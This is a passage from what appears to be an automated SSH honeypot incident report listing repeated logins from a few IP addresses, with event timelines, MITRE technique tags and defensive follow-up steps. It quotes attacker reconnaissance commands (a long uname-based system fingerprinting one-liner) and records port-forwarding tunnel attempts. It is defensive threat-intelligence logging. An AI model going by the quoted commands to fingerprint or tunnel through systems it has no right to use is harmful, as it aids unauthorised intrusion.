| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:51:23` | `cowrie.session.connect` |
| `2026-08-30 12:51:24` | `cowrie.client.version` |
| `2026-08-30 12:51:24` | `cowrie.client.kex` |
| `2026-08-30 12:51:25` | `cowrie.login.success` |
| `2026-08-30 12:51:27` | `cowrie.session.params` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.command.success` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.command.input` |
| `2026-08-30 12:51:27` | `cowrie.log.closed` |
| `2026-08-30 12:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4a561970bb4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:52 |
| **Last Seen** | 2026-08-30 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:52:21` | `cowrie.session.connect` |
| `2026-08-30 12:52:21` | `cowrie.client.version` |
| `2026-08-30 12:52:21` | `cowrie.client.kex` |
| `2026-08-30 12:52:22` | `cowrie.login.success` |
| `2026-08-30 12:52:23` | `cowrie.session.params` |
| `2026-08-30 12:52:23` | `cowrie.command.input` |
| `2026-08-30 12:52:23` | `cowrie.log.closed` |
| `2026-08-30 12:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e6b580e8492

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:53 |
| **Last Seen** | 2026-08-30 12:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:53:01` | `cowrie.session.connect` |
| `2026-08-30 12:53:02` | `cowrie.client.version` |
| `2026-08-30 12:53:02` | `cowrie.client.kex` |
| `2026-08-30 12:53:03` | `cowrie.login.success` |
| `2026-08-30 12:53:05` | `cowrie.session.params` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.command.success` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.command.input` |
| `2026-08-30 12:53:05` | `cowrie.log.closed` |
| `2026-08-30 12:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e36d7df61837

| Field | Detail |
|---|---|
| **Source IP** | `121.167.110[.]137` |
| **First Seen** | 2026-08-30 12:54 |
| **Last Seen** | 2026-08-30 12:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:54:00` | `cowrie.session.connect` |
| `2026-08-30 12:54:01` | `cowrie.client.version` |
| `2026-08-30 12:54:01` | `cowrie.client.kex` |
| `2026-08-30 12:54:04` | `cowrie.login.success` |
| `2026-08-30 12:54:05` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.167.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `121.167.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-041b62ee2604

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-08-30 12:54 |
| **Last Seen** | 2026-08-30 12:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:54:15` | `cowrie.session.connect` |
| `2026-08-30 12:54:15` | `cowrie.client.version` |
| `2026-08-30 12:54:15` | `cowrie.client.kex` |
| `2026-08-30 12:54:18` | `cowrie.login.success` |
| `2026-08-30 12:54:18` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8801ea717266

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:54 |
| **Last Seen** | 2026-08-30 12:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:54:40` | `cowrie.session.connect` |
| `2026-08-30 12:54:40` | `cowrie.client.version` |
| `2026-08-30 12:54:40` | `cowrie.client.kex` |
| `2026-08-30 12:54:42` | `cowrie.login.success` |
| `2026-08-30 12:54:44` | `cowrie.session.params` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.command.success` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.command.input` |
| `2026-08-30 12:54:44` | `cowrie.log.closed` |
| `2026-08-30 12:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2eabdb0c591

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:54 |
| **Last Seen** | 2026-08-30 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:54:44` | `cowrie.session.connect` |
| `2026-08-30 12:54:44` | `cowrie.client.version` |
| `2026-08-30 12:54:44` | `cowrie.client.kex` |
| `2026-08-30 12:54:45` | `cowrie.login.success` |
| `2026-08-30 12:54:45` | `cowrie.session.params` |
| `2026-08-30 12:54:45` | `cowrie.command.input` |
| `2026-08-30 12:54:46` | `cowrie.log.closed` |
| `2026-08-30 12:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac9f47e41e8a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:55 |
| **Last Seen** | 2026-08-30 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:55:05` | `cowrie.session.connect` |
| `2026-08-30 12:55:05` | `cowrie.client.version` |
| `2026-08-30 12:55:05` | `cowrie.client.kex` |
| `2026-08-30 12:55:06` | `cowrie.login.success` |
| `2026-08-30 12:55:06` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:55:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:55:07` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b69dfa2da80

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:56 |
| **Last Seen** | 2026-08-30 12:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:56:23` | `cowrie.session.connect` |
| `2026-08-30 12:56:23` | `cowrie.client.version` |
| `2026-08-30 12:56:23` | `cowrie.client.kex` |
| `2026-08-30 12:56:25` | `cowrie.login.success` |
| `2026-08-30 12:56:26` | `cowrie.session.params` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.command.success` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.command.input` |
| `2026-08-30 12:56:26` | `cowrie.log.closed` |
| `2026-08-30 12:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4287e53aaf0d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:56 |
| **Last Seen** | 2026-08-30 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:56:59` | `cowrie.session.connect` |
| `2026-08-30 12:56:59` | `cowrie.client.version` |
| `2026-08-30 12:56:59` | `cowrie.client.kex` |
| `2026-08-30 12:57:00` | `cowrie.login.success` |
| `2026-08-30 12:57:01` | `cowrie.session.params` |
| `2026-08-30 12:57:01` | `cowrie.command.input` |
| `2026-08-30 12:57:01` | `cowrie.log.closed` |
| `2026-08-30 12:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e9707e0ab8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:58 |
| **Last Seen** | 2026-08-30 12:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:58:09` | `cowrie.session.connect` |
| `2026-08-30 12:58:09` | `cowrie.client.version` |
| `2026-08-30 12:58:09` | `cowrie.client.kex` |
| `2026-08-30 12:58:11` | `cowrie.login.success` |
| `2026-08-30 12:58:12` | `cowrie.session.params` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.command.success` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.command.input` |
| `2026-08-30 12:58:12` | `cowrie.log.closed` |
| `2026-08-30 12:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac6afb55857

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:59 |
| **Last Seen** | 2026-08-30 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:59:18` | `cowrie.session.connect` |
| `2026-08-30 12:59:18` | `cowrie.client.version` |
| `2026-08-30 12:59:18` | `cowrie.client.kex` |
| `2026-08-30 12:59:19` | `cowrie.login.success` |
| `2026-08-30 12:59:20` | `cowrie.session.params` |
| `2026-08-30 12:59:20` | `cowrie.command.input` |
| `2026-08-30 12:59:20` | `cowrie.log.closed` |
| `2026-08-30 12:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe1bf354ad07

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:00 |
| **Last Seen** | 2026-08-30 13:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:00:04` | `cowrie.session.connect` |
| `2026-08-30 13:00:04` | `cowrie.client.version` |
| `2026-08-30 13:00:04` | `cowrie.client.kex` |
| `2026-08-30 13:00:06` | `cowrie.login.success` |
| `2026-08-30 13:00:07` | `cowrie.session.params` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.command.success` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.command.input` |
| `2026-08-30 13:00:07` | `cowrie.log.closed` |
| `2026-08-30 13:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6bbf8d82bd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:00 |
| **Last Seen** | 2026-08-30 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:00:10` | `cowrie.session.connect` |
| `2026-08-30 13:00:10` | `cowrie.client.version` |
| `2026-08-30 13:00:10` | `cowrie.client.kex` |
| `2026-08-30 13:00:11` | `cowrie.login.success` |
| `2026-08-30 13:00:11` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:00:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:00:12` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3a100fbf33

| Field | Detail |
|---|---|
| **Source IP** | `31.173.29[.]136` |
| **First Seen** | 2026-08-30 13:01 |
| **Last Seen** | 2026-08-30 13:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:01:18` | `cowrie.session.connect` |
| `2026-08-30 13:01:19` | `cowrie.client.version` |
| `2026-08-30 13:01:19` | `cowrie.client.kex` |
| `2026-08-30 13:01:23` | `cowrie.login.success` |
| `2026-08-30 13:01:23` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.29[.]136` to AbuseIPDB if not already reported
- [ ] Block `31.173.29[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab446a63c8e

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-30 13:01 |
| **Last Seen** | 2026-08-30 13:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:01:29` | `cowrie.session.connect` |
| `2026-08-30 13:01:29` | `cowrie.client.version` |
| `2026-08-30 13:01:29` | `cowrie.client.kex` |
| `2026-08-30 13:01:30` | `cowrie.login.success` |
| `2026-08-30 13:01:31` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f0ff5cbac0d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:01 |
| **Last Seen** | 2026-08-30 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:01:35` | `cowrie.session.connect` |
| `2026-08-30 13:01:35` | `cowrie.client.version` |
| `2026-08-30 13:01:35` | `cowrie.client.kex` |
| `2026-08-30 13:01:36` | `cowrie.login.success` |
| `2026-08-30 13:01:36` | `cowrie.session.params` |
| `2026-08-30 13:01:36` | `cowrie.command.input` |
| `2026-08-30 13:01:37` | `cowrie.log.closed` |
| `2026-08-30 13:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad992d9ef823

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:01 |
| **Last Seen** | 2026-08-30 13:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:01:57` | `cowrie.session.connect` |
| `2026-08-30 13:01:57` | `cowrie.client.version` |
| `2026-08-30 13:01:57` | `cowrie.client.kex` |
| `2026-08-30 13:01:58` | `cowrie.login.success` |
| `2026-08-30 13:02:00` | `cowrie.session.params` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
| `2026-08-30 13:02:00` | `cowrie.command.success` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
| `2026-08-30 13:02:00` | `cowrie.command.input` |
